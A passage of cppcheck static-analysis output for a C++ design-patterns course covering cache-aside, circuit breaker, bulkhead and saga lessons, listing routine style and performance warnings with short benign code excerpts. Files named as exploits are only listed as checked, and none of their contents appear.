D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:327:9: performance: Variable 'l1_cache_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        l1_cache_ = std::make_unique<LRUCache<Key, Value>>(l1_capacity);
        ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:328:9: performance: Variable 'l2_cache_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        l2_cache_ = std::make_unique<LFUCache<Key, Value>>(l2_capacity);
        ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:190:5: style: Class 'LFUCache < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    LFUCache(size_t capacity) : capacity_(capacity), min_frequency_(0) {
    ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:190:5: style: Class 'LFUCache < int , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    LFUCache(size_t capacity) : capacity_(capacity), min_frequency_(0) {
    ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:77:5: style: Class 'LRUCache < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    LRUCache(size_t capacity) : capacity_(capacity) {
    ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:77:5: style: Class 'LRUCache < int , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    LRUCache(size_t capacity) : capacity_(capacity) {
    ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:221:27: performance: Searching before insertion is not necessary. Instead of 'cache_[key]=value' consider using 'cache_.try_emplace(key, value);'. [stlFindInsert]
            cache_[key] = value;
                          ^
148/194 files checked 79% done
Checking D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_vulnerabilities.cpp ...
149/194 files checked 79% done
Checking D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\exploits\cache_aside_exploits.cpp ...
150/194 files checked 79% done
Checking D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp:235:5: style: Class 'L2Cache < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    L2Cache(size_t max_size, std::chrono::milliseconds latency = std::chrono::milliseconds(10))
    ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp:88:5: style: Class 'L1Cache < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    L1Cache(size_t max_size, size_t max_memory_mb = 100)
    ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp:40:5: style: Struct 'CacheEntry < std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    CacheEntry(T val, size_t size = 0)
    ^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp:270:31: style: Consider using std::min_element algorithm instead of a raw loop. [useStlAlgorithm]
                    oldest_it = it;
                              ^
151/194 files checked 80% done
Checking D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\secure_cache_aside_alternatives.cpp ...
152/194 files checked 81% done
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:346:20: performance: inconclusive: Technically the member function 'CircuitBreakerCpp23 < std :: string , std :: string >::getRecentErrors' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::vector<E> getRecentErrors() const {
                   ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:457:17: performance: inconclusive: Technically the member function 'CircuitBreakerCpp23 < std :: string , std :: string >::stateToString' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string stateToString(CircuitState state) const {
                ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:181:17: performance: inconclusive: Technically the member function 'CircuitBreakerCpp20 < std :: string >::stateToString' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string stateToString(CircuitState state) const {
                ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:514:5: style: Class 'UnstableService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    UnstableService(double failureRate = 0.3)
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:266:5: style: Class 'CircuitBreakerCpp23 < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    CircuitBreakerCpp23(const std::string& name,
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:57:5: style: Class 'CircuitBreakerCpp20 < std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    CircuitBreakerCpp20(const std::string& name,
    ^
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp: __cpp_lib_expected...
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp: __cpp_lib_print...
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp: __cpp_lib_stacktrace...
153/194 files checked 82% done
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:386:10: style: inconclusive: Technically the member function 'ServiceOrchestrator::printAllStatistics' can be const. [functionConst]
    void printAllStatistics() {
         ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:393:10: style: inconclusive: Technically the member function 'ServiceOrchestrator::resetAllServices' can be const. [functionConst]
    void resetAllServices() {
         ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:273:17: performance: inconclusive: Technically the member function 'CircuitBreaker < std :: string >::stateToString' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string stateToString(CircuitState state) const {
                ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:297:5: style: Class 'UnstableService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    UnstableService(double failureRate = 0.3)
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:329:5: style: Class 'ResilientService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    ResilientService(const std::string& name, double failureRate = 0.3)
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:60:5: style: Class 'CircuitBreaker < std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    CircuitBreaker(const std::string& name,
    ^
154/194 files checked 83% done
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_vulnerabilities.cpp ...
155/194 files checked 83% done
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\exploits\circuit_breaker_exploits.cpp ...
156/194 files checked 83% done
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:72:9: performance: Variable 'last_failure_time_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        last_failure_time_ = std::chrono::system_clock::now();
        ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:38:5: style: Struct 'CircuitBreakerConfig' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    CircuitBreakerConfig(
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:218:5: style: Struct 'RetryPolicy' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    RetryPolicy(size_t attempts = 3,
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:261:5: style: Class 'HTTPService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    HTTPService(const std::string& name, double failure_rate = 0.0)
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:311:5: style: Class 'ResilientHTTPClient' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    ResilientHTTPClient(std::shared_ptr<HTTPService> service,
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:399:5: style: Class 'ResilientDatabaseClient' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    ResilientDatabaseClient(std::shared_ptr<Database> db,
    ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:460:25: style: Variable 'response' is assigned a value that is never used. [unreadVariable]
            std::string response = client.request("/api/endpoint");
                        ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:484:25: style: Variable 'result' is assigned a value that is never used. [unreadVariable]
            std::string result = client.query("SELECT * FROM users WHERE id=" + std::to_string(i));
                        ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:497:25: style: Variable 'result' is assigned a value that is never used. [unreadVariable]
            std::string result = client.query("SELECT * FROM users WHERE id=" + std::to_string(i % 5));
                        ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:514:25: style: Variable 'result' is assigned a value that is never used. [unreadVariable]
            std::string result = client.query("SELECT * FROM users WHERE id=" + std::to_string(i));
                        ^
157/194 files checked 84% done
Checking D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\secure_circuit_breaker_alternatives.cpp ...
158/194 files checked 84% done
Checking D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\bulkhead_cpp23_comparison.cpp ...
159/194 files checked 84% done
Checking D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\bulkhead_pattern.cpp ...
160/194 files checked 85% done
Checking D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\bulkhead_vulnerabilities.cpp ...
161/194 files checked 85% done
Checking D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\exploits\bulkhead_exploits.cpp ...
162/194 files checked 86% done
Checking D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:33:5: style: Struct 'ResourceLimits' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    ResourceLimits(size_t memory_mb = 100,
    ^
163/194 files checked 87% done
Checking D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\secure_bulkhead_alternatives.cpp ...
164/194 files checked 87% done
Checking D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:310:10: performance: inconclusive: Technically the member function 'OrderService::createOrder' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool createOrder(const std::string& order_id) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:317:10: performance: inconclusive: Technically the member function 'OrderService::cancelOrder' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool cancelOrder(const std::string& order_id) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:332:10: style: inconclusive: Technically the member function 'PaymentService::processPayment' can be const. [functionConst]
    bool processPayment(const std::string& order_id, double amount) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:351:10: performance: inconclusive: Technically the member function 'PaymentService::refundPayment' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool refundPayment(const std::string& order_id) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:361:10: performance: inconclusive: Technically the member function 'InventoryService::reserveItems' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool reserveItems(const std::string& order_id) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:368:10: performance: inconclusive: Technically the member function 'InventoryService::releaseItems' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool releaseItems(const std::string& order_id) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:378:10: performance: inconclusive: Technically the member function 'ShippingService::scheduleShipment' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool scheduleShipment(const std::string& order_id) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:385:10: performance: inconclusive: Technically the member function 'ShippingService::cancelShipment' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool cancelShipment(const std::string& order_id) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:330:5: style: Class 'PaymentService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    PaymentService(double failure_rate = 0.0) : failure_rate_(failure_rate) {}
    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:411:45: style: Return value 'order_service.createOrder("ORDER_12345")' is always true [knownConditionTrueFalse]
            return order_service.createOrder("ORDER_12345");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:411:45: note: Calling function 'createOrder' returns 1
            return order_service.createOrder("ORDER_12345");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:411:45: note: Return value 'order_service.createOrder("ORDER_12345")' is always true
            return order_service.createOrder("ORDER_12345");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:414:45: style: Return value 'order_service.cancelOrder("ORDER_12345")' is always true [knownConditionTrueFalse]
            return order_service.cancelOrder("ORDER_12345");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:414:45: note: Calling function 'cancelOrder' returns 1
            return order_service.cancelOrder("ORDER_12345");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:414:45: note: Return value 'order_service.cancelOrder("ORDER_12345")' is always true
            return order_service.cancelOrder("ORDER_12345");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:424:49: style: Return value 'payment_service.refundPayment("ORDER_12345")' is always true [knownConditionTrueFalse]
            return payment_service.refundPayment("ORDER_12345");
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:424:49: note: Calling function 'refundPayment' returns 1
            return payment_service.refundPayment("ORDER_12345");
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:424:49: note: Return value 'payment_service.refundPayment("ORDER_12345")' is always true
            return payment_service.refundPayment("ORDER_12345");
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:431:50: style: Return value 'inventory_service.reserveItems("ORDER_12345")' is always true [knownConditionTrueFalse]
            return inventory_service.reserveItems("ORDER_12345");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:431:50: note: Calling function 'reserveItems' returns 1
            return inventory_service.reserveItems("ORDER_12345");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:431:50: note: Return value 'inventory_service.reserveItems("ORDER_12345")' is always true
            return inventory_service.reserveItems("ORDER_12345");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:434:50: style: Return value 'inventory_service.releaseItems("ORDER_12345")' is always true [knownConditionTrueFalse]
            return inventory_service.releaseItems("ORDER_12345");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:434:50: note: Calling function 'releaseItems' returns 1
            return inventory_service.releaseItems("ORDER_12345");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:434:50: note: Return value 'inventory_service.releaseItems("ORDER_12345")' is always true
            return inventory_service.releaseItems("ORDER_12345");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:441:53: style: Return value 'shipping_service.scheduleShipment("ORDER_12345")' is always true [knownConditionTrueFalse]
            return shipping_service.scheduleShipment("ORDER_12345");
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:441:53: note: Calling function 'scheduleShipment' returns 1
            return shipping_service.scheduleShipment("ORDER_12345");
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:441:53: note: Return value 'shipping_service.scheduleShipment("ORDER_12345")' is always true
            return shipping_service.scheduleShipment("ORDER_12345");
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:444:51: style: Return value 'shipping_service.cancelShipment("ORDER_12345")' is always true [knownConditionTrueFalse]
            return shipping_service.cancelShipment("ORDER_12345");
                                                  ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:444:51: note: Calling function 'cancelShipment' returns 1
            return shipping_service.cancelShipment("ORDER_12345");
                                                  ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:444:51: note: Return value 'shipping_service.cancelShipment("ORDER_12345")' is always true
            return shipping_service.cancelShipment("ORDER_12345");
                                                  ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:473:45: style: Return value 'order_service.createOrder("ORDER_67890")' is always true [knownConditionTrueFalse]
            return order_service.createOrder("ORDER_67890");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:473:45: note: Calling function 'createOrder' returns 1
            return order_service.createOrder("ORDER_67890");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:473:45: note: Return value 'order_service.createOrder("ORDER_67890")' is always true
            return order_service.createOrder("ORDER_67890");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:476:45: style: Return value 'order_service.cancelOrder("ORDER_67890")' is always true [knownConditionTrueFalse]
            return order_service.cancelOrder("ORDER_67890");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:476:45: note: Calling function 'cancelOrder' returns 1
            return order_service.cancelOrder("ORDER_67890");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:476:45: note: Return value 'order_service.cancelOrder("ORDER_67890")' is always true
            return order_service.cancelOrder("ORDER_67890");
                                            ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:485:49: style: Return value 'payment_service.refundPayment("ORDER_67890")' is always true [knownConditionTrueFalse]
            return payment_service.refundPayment("ORDER_67890");
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:485:49: note: Calling function 'refundPayment' returns 1
            return payment_service.refundPayment("ORDER_67890");
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:485:49: note: Return value 'payment_service.refundPayment("ORDER_67890")' is always true
            return payment_service.refundPayment("ORDER_67890");
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:491:50: style: Return value 'inventory_service.reserveItems("ORDER_67890")' is always true [knownConditionTrueFalse]
            return inventory_service.reserveItems("ORDER_67890");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:491:50: note: Calling function 'reserveItems' returns 1
            return inventory_service.reserveItems("ORDER_67890");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:491:50: note: Return value 'inventory_service.reserveItems("ORDER_67890")' is always true
            return inventory_service.reserveItems("ORDER_67890");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:494:50: style: Return value 'inventory_service.releaseItems("ORDER_67890")' is always true [knownConditionTrueFalse]
            return inventory_service.releaseItems("ORDER_67890");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:494:50: note: Calling function 'releaseItems' returns 1
            return inventory_service.releaseItems("ORDER_67890");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:494:50: note: Return value 'inventory_service.releaseItems("ORDER_67890")' is always true
            return inventory_service.releaseItems("ORDER_67890");
                                                 ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:500:53: style: Return value 'shipping_service.scheduleShipment("ORDER_67890")' is always true [knownConditionTrueFalse]
            return shipping_service.scheduleShipment("ORDER_67890");
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:500:53: note: Calling function 'scheduleShipment' returns 1
            return shipping_service.scheduleShipment("ORDER_67890");
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:500:53: note: Return value 'shipping_service.scheduleShipment("ORDER_67890")' is always true
            return shipping_service.scheduleShipment("ORDER_67890");
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:503:51: style: Return value 'shipping_service.cancelShipment("ORDER_67890")' is always true [knownConditionTrueFalse]
            return shipping_service.cancelShipment("ORDER_67890");
                                                  ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:503:51: note: Calling function 'cancelShipment' returns 1
            return shipping_service.cancelShipment("ORDER_67890");
                                                  ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:503:51: note: Return value 'shipping_service.cancelShipment("ORDER_67890")' is always true
            return shipping_service.cancelShipment("ORDER_67890");
                                                  ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:533:49: style: Return value 'order_service.createOrder(order_id)' is always true [knownConditionTrueFalse]
                return order_service.createOrder(order_id);
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:533:49: note: Calling function 'createOrder' returns 1
                return order_service.createOrder(order_id);
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:533:49: note: Return value 'order_service.createOrder(order_id)' is always true
                return order_service.createOrder(order_id);
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:536:49: style: Return value 'order_service.cancelOrder(order_id)' is always true [knownConditionTrueFalse]
                return order_service.cancelOrder(order_id);
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:536:49: note: Calling function 'cancelOrder' returns 1
                return order_service.cancelOrder(order_id);
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:536:49: note: Return value 'order_service.cancelOrder(order_id)' is always true
                return order_service.cancelOrder(order_id);
                                                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:545:53: style: Return value 'payment_service.refundPayment(order_id)' is always true [knownConditionTrueFalse]
                return payment_service.refundPayment(order_id);
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:545:53: note: Calling function 'refundPayment' returns 1
                return payment_service.refundPayment(order_id);
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:545:53: note: Return value 'payment_service.refundPayment(order_id)' is always true
                return payment_service.refundPayment(order_id);
                                                    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:551:54: style: Return value 'inventory_service.reserveItems(order_id)' is always true [knownConditionTrueFalse]
                return inventory_service.reserveItems(order_id);
                                                     ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:551:54: note: Calling function 'reserveItems' returns 1
                return inventory_service.reserveItems(order_id);
                                                     ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:551:54: note: Return value 'inventory_service.reserveItems(order_id)' is always true
                return inventory_service.reserveItems(order_id);
                                                     ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:554:54: style: Return value 'inventory_service.releaseItems(order_id)' is always true [knownConditionTrueFalse]
                return inventory_service.releaseItems(order_id);
                                                     ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:554:54: note: Calling function 'releaseItems' returns 1
                return inventory_service.releaseItems(order_id);
                                                     ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:554:54: note: Return value 'inventory_service.releaseItems(order_id)' is always true
                return inventory_service.releaseItems(order_id);
                                                     ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:560:57: style: Return value 'shipping_service.scheduleShipment(order_id)' is always true [knownConditionTrueFalse]
                return shipping_service.scheduleShipment(order_id);
                                                        ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:560:57: note: Calling function 'scheduleShipment' returns 1
                return shipping_service.scheduleShipment(order_id);
                                                        ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:560:57: note: Return value 'shipping_service.scheduleShipment(order_id)' is always true
                return shipping_service.scheduleShipment(order_id);
                                                        ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:563:55: style: Return value 'shipping_service.cancelShipment(order_id)' is always true [knownConditionTrueFalse]
                return shipping_service.cancelShipment(order_id);
                                                      ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:563:55: note: Calling function 'cancelShipment' returns 1
                return shipping_service.cancelShipment(order_id);
                                                      ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:563:55: note: Return value 'shipping_service.cancelShipment(order_id)' is always true
                return shipping_service.cancelShipment(order_id);
                                                      ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:449:10: style: Variable 'success' is assigned a value that is never used. [unreadVariable]
    bool success = orchestrator.executeTransaction("ORDER_12345");
         ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:508:10: style: Variable 'success' is assigned a value that is never used. [unreadVariable]
    bool success = orchestrator.executeTransaction("ORDER_67890");
         ^
165/194 files checked 88% done
Checking D:\Work\Patterns\08-high-load\lesson_8_4_saga\exploits\saga_exploits.cpp ...
166/194 files checked 88% done
Checking D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_cpp23_comparison.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_cpp23_comparison.cpp:42:14: performance: inconclusive: Technically the member function 'cpp17::Saga::step1' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        void step1() { std::cout << "Step 1\n"; }
             ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_cpp23_comparison.cpp:43:14: performance: inconclusive: Technically the member function 'cpp17::Saga::step2' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        void step2() { throw std::runtime_error("Fail"); }
             ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_cpp23_comparison.cpp:90:35: performance: inconclusive: Technically the member function 'cpp23::Saga::step1' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        expected<void, SagaError> step1() { std::cout << "Step 1\n"; return {}; }
                                  ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_cpp23_comparison.cpp:91:35: performance: inconclusive: Technically the member function 'cpp23::Saga::step2' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        expected<void, SagaError> step2() { return unexpected(SagaError::Step2Failed); }
                                  ^
167/194 files checked 88% done
Checking D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_pattern.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_pattern.cpp:101:5: style: Class 'OrchestrationSaga' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    OrchestrationSaga(const std::string& id) : Saga(id) {
    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_pattern.cpp:183:5: style: Class 'ChoreographySaga' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    ChoreographySaga(const std::string& id) : Saga(id) {
    ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_pattern.cpp:495:17: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
        threads.emplace_back([&saga]() {
                ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_pattern.cpp:447:10: style: Variable 'success' is assigned a value that is never used. [unreadVariable]
    bool success = saga->execute();
         ^
168/194 files checked 89% done
Checking D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_vulnerabilities.cpp ...
169/194 files checked 89% done
Checking D:\Work\Patterns\08-high-load\lesson_8_4_saga\secure_saga_alternatives.cpp ...
170/194 files checked 90% done
Checking D:\Work\Patterns\09-performance\lesson_9_1_object_pool\exploits\object_pool_exploits.cpp ...
171/194 files checked 90% done
Checking D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_cpp23_comparison.cpp ...
